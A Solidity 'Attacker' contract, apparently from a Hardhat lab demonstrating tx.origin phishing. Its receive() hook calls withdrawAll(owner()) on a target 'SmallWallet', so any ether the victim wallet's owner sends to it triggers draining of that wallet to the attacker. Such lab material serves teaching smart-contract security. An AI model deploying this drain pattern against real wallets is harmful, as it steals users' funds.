// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import "@openzeppelin/contracts/access/Ownable.sol";
import "hardhat/console.sol";
interface ISmallWallet {
    function withdrawAll(address _recipient) external;
}

contract Attacker is Ownable {
    ISmallWallet private immutable smallWallet;

    constructor(ISmallWallet _smallWallet) {
        smallWallet = _smallWallet;
    }
    receive() external payable{
        // console.log("Hello, world!", owner);
        smallWallet.withdrawAll(owner());
    }
}